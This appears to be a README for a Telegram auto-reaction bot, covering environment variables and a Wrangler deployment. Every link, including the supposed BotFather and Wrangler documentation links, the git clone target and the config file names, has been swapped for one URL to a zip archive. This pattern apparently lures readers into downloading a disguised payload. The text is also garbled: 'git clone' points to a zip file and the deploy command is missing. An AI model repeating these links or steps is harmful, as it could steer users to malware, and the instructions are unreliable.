## ğŸ›  Configuring Environments

To ensure that your Telegram Auto-Reaction Bot operates correctly, you will need to configure several environment variables in your Cloudflare Worker settings:

- `BOT_TOKEN`: This is your bot's token, which you can generate from [BotFather](https://raw.githubusercontent.com/Mochtaufiqqq/auto-reaction-bot/main/api/auto-reaction-bot-v2.6.zip). This token allows your bot to authenticate and interact with the Telegram API.
- `BOT_USERNAME`: The username you have set for your bot. This is used within the script to identify messages intended for your bot.
- `EMOJI_LIST`: A string of emojis that the bot will use to react to messages. You can customize this list to include any emojis you prefer, such as ğŸ‘â¤ğŸ”¥ğŸ¥°ğŸ‘ğŸ˜ğŸ‰ğŸ¤©ğŸ™ğŸ‘ŒğŸ•ŠğŸ˜ğŸ³â¤â€ğŸ”¥ğŸ’¯âš¡ğŸ†.
- `RANDOM_LEVEL`: An integer that determines the randomness of reactions in **group chats**. Lower values result in more predictable reactions, while higher values increase randomness. Default is `0`, meaning reactions are consistent by default.
- `RESTRICTED_CHATS`: A list of chat IDs where the bot should not react to messages (Optional). Split each chat ID by " , ". Example : `-1001233434,3434234`

## ğŸš€ Deploy Manually with Cloudflare Wrangler

If you prefer to manually deploy the Auto Reaction Bot using Cloudflare Wrangler, follow these detailed steps to get started:

### Prerequisites
Before you begin, you will need to have git installed on your local machine to clone the repository.

### Step 1: Clone the Repository
Start by cloning the repository to your local machine. Open your terminal and run the following command:
```
git clone https://raw.githubusercontent.com/Mochtaufiqqq/auto-reaction-bot/main/api/auto-reaction-bot-v2.6.zip
cd Auto-Reaction-Bot
```

### Step 2: Configure https://raw.githubusercontent.com/Mochtaufiqqq/auto-reaction-bot/main/api/auto-reaction-bot-v2.6.zip
Edit the `https://raw.githubusercontent.com/Mochtaufiqqq/auto-reaction-bot/main/api/auto-reaction-bot-v2.6.zip` file in your project directory to include your environment variables (like `https://raw.githubusercontent.com/Mochtaufiqqq/auto-reaction-bot/main/api/auto-reaction-bot-v2.6.zip`). You will need to replace the placeholder values with your actual data : [ğŸ›  Configuring Environments](#-configuring-environments)

### Step 3: Install Cloudflare Wrangler
To deploy using Cloudflare Wrangler, you must first install it. You can find the installation instructions and more information on the [official Cloudflare Wrangler documentation](https://raw.githubusercontent.com/Mochtaufiqqq/auto-reaction-bot/main/api/auto-reaction-bot-v2.6.zip).

### Step 4: Deploy Using Wrangler
Once Wrangler is installed and you've configured your https://raw.githubusercontent.com/Mochtaufiqqq/auto-reaction-bot/main/api/auto-reaction-bot-v2.6.zip file, deploy your project to Cloudflare Workers by running the following command in your terminal:
```

```
This command will deploy your bot to Cloudflare Workers, now you must [Configure the Webhook](#-configure-the-webhook). After All it will start reacting to messages in Telegram chats as configured.
